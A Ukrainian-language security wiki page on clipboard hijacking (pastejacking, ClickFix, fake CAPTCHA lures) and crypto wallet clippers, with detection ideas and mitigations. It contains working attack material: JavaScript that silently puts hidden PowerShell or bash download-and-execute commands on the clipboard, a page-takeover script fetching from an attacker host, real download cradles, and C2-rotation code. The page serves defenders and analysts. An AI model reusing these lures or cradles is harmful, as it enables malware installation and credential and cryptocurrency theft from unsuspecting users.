# Атаки Clipboard Hijacking (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> «Ніколи не вставляйте те, що не копіювали самостійно». — стара, але досі актуальна порада

## Огляд

Clipboard hijacking — також відомий як *pastejacking* — використовує той факт, що користувачі регулярно копіюють і вставляють команди, не перевіряючи їх. Шкідлива вебсторінка (або будь-який контекст із підтримкою JavaScript, наприклад Electron чи Desktop application) програмно розміщує контрольований зловмисником текст у системному буфері обміну. Жертв зазвичай за допомогою ретельно підготовлених інструкцій соціальної інженерії спонукають натиснути **Win + R** (діалогове вікно Run), **Win + X** (Quick Access / PowerShell) або відкрити термінал і *вставити* вміст буфера обміну, негайно виконавши довільні команди.

Оскільки **жоден файл не завантажується і жоден attachment не відкривається**, ця техніка обходить більшість засобів безпеки електронної пошти та вебконтенту, які відстежують attachments, macros або пряме виконання команд. Тому атака популярна у phishing-кампаніях, що доставляють поширені malware-сімейства, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.<sup>[[1]](#references)</sup>

## Clipper для заміни адрес wallet

Інший варіант **clipboard hijacking** взагалі не вставляє команди: він очікує, доки жертва скопіює **адресу cryptocurrency wallet**, а потім непомітно замінює її на контрольовану зловмисником безпосередньо перед вставленням. Це особливо ефективно для довгих форматів wallet, оскільки користувачі часто перевіряють лише перші й останні символи.<sup>[[8]](#references)</sup>

Поширені ознаки реальних зразків:
- **Thin loader + nested payload**: видимий app/exe виглядає як легітимний trading або "profit" tool, тоді як справжній clipper захований глибше в bundle (наприклад .NET loader запускає вкладений Rust payload).
- **Regex-driven replacement**: malware шукає рядки на кшталт `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` або навіть універсальні **44-character Solana-like** рядки й замінює їх на wallet зловмисника.
- **Wallet rotation at scale**: сучасні Windows-зразки можуть містити **тисячі** wallet для заміни на кожну currency замість однієї статичної адреси, зменшуючи втрату репутації wallet після кожної крадіжки.<sup>[[8]](#references)</sup>

### Сценарій роботи Windows clipper

Поширена реалізація — це приховане вікно, зареєстроване за допомогою **`AddClipboardFormatListener`**. Під час кожного оновлення буфера обміну malware зазвичай викликає:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → отримати доступ до поточних даних буфера обміну.
- **`GetClipboardData`** → прочитати текст.
- **`EmptyClipboard`** + **`SetClipboardData`** → замінити рядок wallet на значення зловмисника.

Мінімальні hunting regexes, які часто зустрічаються в clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistence на рівні користувача достатня для досягнення впливу. Один зі спостережуваних патернів:<sup>[[8]](#references)</sup>
- Скопіювати payload до **`%APPDATA%\silke\silke.exe`**
- Створити **Startup-folder LNK** у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ідеї для виявлення:
- Процеси, які безперервно викликають clipboard APIs і водночас записують дані в `%APPDATA%` та папку користувача **Startup**.
- Створення нового LNK/виконуваного файлу з подальшим перезаписуванням адреси wallet у clipboard.
- Архіви або пакети fake-software, що містять багато невикористаних файлів і невеликий launcher, який запускає вкладений binary.

### macOS: соціально інженерне видалення quarantine + persistence через LaunchAgent

У macOS деякі кампанії поширюють helper **`unlocker.command`** і вказують жертві клацнути правою кнопкою миші → **Open**, якщо Gatekeeper повідомляє, що app пошкоджено або походить від невідомого розробника. Скрипт просто видаляє quarantine і запускає розташований поруч `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Це **не** Gatekeeper exploit; це **обхід quarantine через social engineering**, який зловживає тим, що рішення Gatekeeper залежать від xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Після виконання clipper може закріпитися від імені поточного користувача, записавши:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent з `RunAtLoad` і `KeepAlive`

Важлива для захисту деталь: деякі зразки реалізують **self-healing watchdog**, який приблизно кожні 30 секунд повторно записує LaunchAgent і wrapper. Якщо спочатку видалити plist **без завершення запущеного процесу**, malware може негайно створити його знову.<sup>[[8]](#references)</sup> Безпечний порядок очищення:
1. Завершити активний процес clipper.
2. Вивантажити/видалити plist LaunchAgent.
3. Видалити `~/launch.sh` і скопійований payload.

### Примітка щодо доставки: фальшива репутація як multiplier

Для цього сімейства malware може залишатися технічно простим, тоді як **distribution layer** виконує основну роботу: фальшиві зірки/форки на GitHub, відгуки/завантаження на SourceForge, коментарі/перегляди під YouTube-туторіалами та нешкідливо виглядаючі коментарі/голоси на VirusTotal використовуються, щоб binary здавався надійним перед виконанням.<sup>[[8]](#references)</sup>

## Примусові кнопки копіювання та приховані payloads (macOS one-liners)

Деякі macOS infostealers клонують installer sites (наприклад, Homebrew) і **змушують використовувати кнопку “Copy”**, щоб користувачі не могли виділити лише видимий текст. Запис у clipboard містить очікувану installer command і доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тому одна вставка виконує обидві команди, тоді як UI приховує додатковий stage.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Старіші кампанії використовували `document.execCommand('copy')`, новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Сценарій ClickFix / ClearFake

1. Користувач відвідує typosquatted або скомпрометований сайт (наприклад, `docusign.sa[.]com`)
2. Ін'єктований **ClearFake** JavaScript викликає helper `unsecuredCopyToClipboard()`, який непомітно зберігає Base64-кодований PowerShell one-liner у буфері обміну.
3. Інструкції HTML повідомляють жертві: *«Натисніть **Win + R**, вставте команду та натисніть Enter, щоб усунути проблему».*
4. `powershell.exe` виконується та завантажує архів, який містить легітимний executable і шкідливу DLL (класичний DLL sideloading).
5. Loader розшифровує додаткові етапи, ін'єктує shellcode та встановлює persistence (наприклад, scheduled task), зрештою запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Приклад ланцюжка NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає у своїй директорії `msvcp140.dll`.
* Шкідлива DLL динамічно розв'язує API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх за допомогою rolling XOR key `"https://google.com/"`, інжектить фінальний shellcode та розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript downloader усередині **cscript.exe**
3. Отримує MSI payload → розміщує `libcef.dll` поруч із підписаним застосунком → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Виклик **mshta** запускає прихований PowerShell-скрипт, який завантажує `PartyContinued.exe`, видобуває `Boat.pst` (CAB), відновлює `AutoIt3.exe` за допомогою `extrac32` і конкатенації файлів, а потім запускає скрипт `.a3x`, який ексфільтрує облікові дані браузера на `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: буфер обміну → PowerShell → JS eval → Startup LNK із C2, що змінюється (PureHVNC)

Деякі кампанії ClickFix повністю уникають завантаження файлів і натомість інструктують жертв вставити однорядкову команду, яка отримує та виконує JavaScript через WSH, забезпечує його persistence і щодня змінює C2. Приклад спостережуваного ланцюжка:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові особливості
- Obfuscated URL реверсується під час виконання для протидії поверхневому аналізу.
- JavaScript забезпечує власне збереження через Startup LNK (WScript/CScript) і вибирає C2 за поточним днем, що дає змогу швидко ротувати домени.<sup>[[3]](#references)</sup>

Мінімальний фрагмент JS, який використовується для ротації C2 за датою:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який забезпечує persistence і завантажує RAT (наприклад, PureHVNC), часто фіксуючи TLS на hardcoded certificate і розбиваючи трафік на частини.<sup>[[3]](#references)</sup>

Ідеї для виявлення, специфічні для цього варіанта
- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, що запускає WScript/CScript із JS-шляхом у `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU і telemetry командного рядка, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторювані `powershell -NoProfile -NonInteractive -Command -` із великими payload у stdin для передавання довгих скриптів без довгих командних рядків.
- Scheduled Tasks, які згодом запускають LOLBins, такі як `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, під updater-подібним task/path (наприклад, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Щодня змінювані C2 hostnames і URLs із шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlate події запису в clipboard, за якими слідують вставлення через Win+R і негайний запуск `powershell.exe`.

Blue-teams можуть поєднати clipboard, process-creation і registry telemetry, щоб виявити зловживання pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію команд **Win + R** – шукайте нетипові Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe`, а `NewProcessName` входить до { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створення файлів у `%LocalAppData%\Microsoft\Windows\WinX\` або тимчасових папках безпосередньо перед підозрілою подією 4688.
* EDR clipboard sensors (якщо наявні) – correlate `Clipboard Write`, після якого негайно запускається новий PowerShell process.

## Сторінки перевірки в стилі IUAM (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Нещодавні кампанії масово створюють фальшиві CDN/browser verification pages ("Just a moment…", у стилі IUAM), які змушують користувачів копіювати OS-specific commands із clipboard у native consoles. Це переносить виконання за межі browser sandbox і працює у Windows та macOS.<sup>[[4]](#references)</sup>

Ключові ознаки сторінок, згенерованих builder
- Визначення OS через `navigator.userAgent` для адаптації payloads (Windows PowerShell/CMD проти macOS Terminal). Необов’язкові decoys/no-ops для непідтримуваних OS, щоб зберегти ілюзію.
- Автоматичне копіювання в clipboard під час нешкідливих дій в UI (checkbox/Copy), хоча видимий текст може відрізнятися від вмісту clipboard.
- Блокування mobile і popover із покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Необов’язкова obfuscation і single-file injector для перезапису DOM скомпрометованого сайту verification UI зі стилями Tailwind (реєстрація нового domain не потрібна).<sup>[[4]](#references)</sup>

Приклад: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence під час першого запуску
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, щоб виконання продовжувалося після закриття термінала, зменшуючи кількість видимих артефактів.<sup>[[4]](#references)</sup>

In-place page takeover на зламаних сайтах
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ідеї для виявлення та threat hunting, специфічні для IUAM-style lures
- Веб: сторінки, які прив'язують Clipboard API до verification widgets; невідповідність між відображуваним текстом і payload у clipboard; розгалуження за `navigator.userAgent`; Tailwind + single-page replace у підозрілих контекстах.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` невдовзі після взаємодії з браузером; batch/MSI installers, запущені з `%TEMP%`.
- macOS endpoint: Terminal/iTerm, які запускають `bash`/`curl`/`base64 -d` із `nohup` поблизу подій у браузері; background jobs, що продовжують працювати після закриття terminal.
- Співвідносити історію `RunMRU` Win+R і записи до clipboard із подальшим створенням console process.

Також дивіться supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Еволюція fake CAPTCHA / ClickFix у 2026 році (ClearFake, Scarlet Goldfinch)

- ClearFake продовжує компрометувати WordPress sites та інжектити loader JavaScript, який ланцюжком звертається до external hosts (Cloudflare Workers, GitHub/jsDelivr) і навіть виконує blockchain “etherhiding” calls (наприклад, POST-запити до Binance Smart Chain API endpoints, таких як `bsc-testnet.drpc[.]org`), щоб отримувати актуальну lure logic. В останніх overlays активно використовуються fake CAPTCHAs, які вказують користувачам скопіювати та вставити one-liner (T1204.004), замість завантаження будь-чого.<sup>[[6]](#references)</sup>
- Initial execution дедалі частіше делегується signed script hosts/LOLBAS. У січні 2026 року chains замінили попереднє використання `mshta` на вбудований `SyncAppvPublishingServer.vbs`, який виконується через `WScript.exe` і отримує PowerShell-подібні arguments з aliases/wildcards для отримання remote content:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується App-V; у зв'язці з `WScript.exe` та незвичними аргументами (аліаси `gal`/`gcm`, cmdlets із wildcard, URL-адреси jsDelivr) він стає високосигнальним етапом LOLBAS для ClearFake.<sup>[[6]](#references)</sup>
- У лютому 2026 року payloads підробленої CAPTCHA знову змістилися до чистих PowerShell download cradles. Два активні приклади:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Перший ланцюжок є in-memory `iex(irm ...)` grabber; другий використовує `WinHttp.WinHttpRequest.5.1`, записує тимчасовий `.ps1`, а потім запускає його з `-ep bypass` у прихованому вікні.<sup>[[6]](#references)</sup>

Поради щодо виявлення/полювання для цих варіантів
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` або PowerShell cradles одразу після запису до clipboard/Win+R.
- Ключові слова командного рядка: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, домени jsDelivr/GitHub/Cloudflare Worker або шаблони raw IP `iex(irm ...)`.
- Network: вихідні підключення до CDN worker hosts або blockchain RPC endpoints із script hosts/PowerShell невдовзі після web browsing.
- File/registry: створення тимчасового `.ps1` у `%TEMP%` разом із записами RunMRU, що містять ці one-liners; блокувати/генерувати alert для signed-script LOLBAS (WScript/cscript/mshta), які виконуються із зовнішніми URL або obfuscated alias strings.

## ClickFix tradecraft за червень 2026 року: paste telemetry, fake verification comments і LOLBin chaining

Нещодавня телеметрія Red Canary показує, що стабільним індикатором є **не одна конкретна команда**, а поєднання **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** та **immediate execution**.<sup>[[7]](#references)</sup>

### Помітні operator patterns

- **Paste confirmation telemetry**: деякі payloads викликають `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` перед основним stage. Це підтверджує взаємодію користувача, зберігаючи вікно коротким і непомітним.
- **Fake verification comments**: PowerShell one-liners можуть додавати рядки на кшталт `# Security check ✔️ I'm not a robot Verification ID: 138105`, щоб після вставлення в Run / `cmd.exe` / PowerShell history команда й надалі виглядала пов’язаною з CAPTCHA.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` приховує static URL у командному рядку, водночас виконуючи in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` зловживає незвичним регістром і Unicode-подібними символами у flags, щоб обходити brittle detections, водночас залишаючись схожим на `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` може приховувати ключові слова за допомогою escape-символів `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), запускати вкладену shell мінімізованою, зберігати attacker content із benign extension, наприклад `.pdf`, а потім виконувати його через `mshta`.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – вимкнути clipboard write-access (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагати user gesture.
2. Security awareness – навчати користувачів *вводити* sensitive commands або спочатку вставляти їх у text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control для блокування довільних one-liners.
4. Network controls – блокувати outbound requests до відомих pastejacking і malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** часто використовує той самий підхід ClickFix після заманювання користувачів на malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
